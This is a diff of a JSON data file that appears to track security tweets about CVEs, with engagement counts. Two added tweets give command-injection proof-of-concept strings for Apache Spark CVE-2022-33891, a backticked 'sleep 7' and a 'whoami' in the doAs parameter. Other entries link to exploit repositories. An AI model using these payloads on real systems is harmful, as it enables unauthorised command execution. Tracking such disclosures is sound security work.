@@ -13,6 +13,16 @@
     "username": "Shadowserver"
 }
 {
+    "tweetfavorites": 672,
+    "tweetquotes": 6,
+    "tweetreplies": 8,
+    "tweetretweets": 180,
+    "tweettext": "CVE-2022-33891 - Apache Spark Shell Command Injection\n\nurl+/?doAs=`sleep 7`",
+    "tweettime": "2022-07-31, 03:30:15",
+    "tweeturl": "https://twitter.com/momika233/status/1553583794682482688",
+    "username": "momika233"
+}
+{
     "expanded_url": [
         "https://youtu.be/RXLdWwAMjz8",
         "https://www.vulnmachines.com"
@@ -328,6 +338,16 @@
     "username": "sirifu4k1"
 }
 {
+    "tweetfavorites": 770,
+    "tweetquotes": 12,
+    "tweetreplies": 12,
+    "tweetretweets": 226,
+    "tweettext": "CVE-2022-33891: Apache Spark shell\ncommand injection vulnerability via Spark\nUI\n\npoc:http://x.x.x.x/doAs?='whoami'",
+    "tweettime": "2022-07-18, 14:05:02",
+    "tweeturl": "https://twitter.com/momika233/status/1549032499871121410",
+    "username": "momika233"
+}
+{
     "expanded_url": [
         "https://github.com/assetnote/jira-mobile-ssrf-exploit"
     ],
@@ -357,10 +377,10 @@
     "expanded_url": [
         "https://github.com/JC175/CVE-2022-32119"
     ],
-    "tweetfavorites": 135,
+    "tweetfavorites": 133,
     "tweetquotes": 2,
     "tweetreplies": 3,
-    "tweetretweets": 54,
+    "tweetretweets": 53,
     "tweettext": "CVE-2022-32119 - Arox-Unrestricted-File-Upload\nhttps://t.co/QjbTLocXSH https://t.co/90bSATsIrL",
     "tweettime": "2022-07-15, 05:04:39",
     "tweeturl": "https://twitter.com/momika233/status/1547809344200540160",
@@ -493,6 +513,20 @@
     "tweettime": "2022-07-07, 14:41:48",
     "tweeturl": "https://twitter.com/cyber_advising/status/1545055486029938692",
     "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://www.openwall.com/lists/oss-security/2022/07/06/5",
+        "https://t.zsxq.com/03BE6MbEI"
+    ],
+    "tweetfavorites": 325,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 104,
+    "tweettext": "CVE-2022-33980: Apache Commons Configuration RCE\n\nhttps://t.co/FB0Ll4OFpj\n\nhttps://t.co/2RVs5DRVSX https://t.co/Zmf5UJOhbP",
+    "tweettime": "2022-07-06, 17:26:51",
+    "tweeturl": "https://twitter.com/chybeta/status/1544734637033160705",
+    "username": "chybeta"
 }
 {
     "expanded_url": [
